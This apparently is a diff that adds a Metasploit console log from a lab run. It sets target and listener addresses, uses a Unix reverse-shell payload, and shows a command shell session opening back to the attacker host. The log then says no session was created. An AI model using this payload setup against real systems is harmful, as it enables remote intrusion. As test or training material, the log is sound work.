@@ -1,0 +1,21 @@
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+RHOSTS => 192.168.128.4
+PAYLOAD => cmd/unix/reverse
+LHOST => 192.168.128.2
+LPORT => 4445
+[!] Unknown datastore option: ExitOnSession.
+ExitOnSession => true
+[*] Started reverse TCP double handler on 192.168.128.2:4445 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo UVzdNbVQTZQ3sIxb;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "sh: line 2: Connected: command not found\r\nsh: line 3: Escape: command not found\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (192.168.128.2:4445 -> 192.168.128.4:34697) at 2026-11-08 16:09:40 -0500
+[*] Exploit completed, but no session was created.
+[-] Session #1 is not a Meterpreter shell. Skipping...
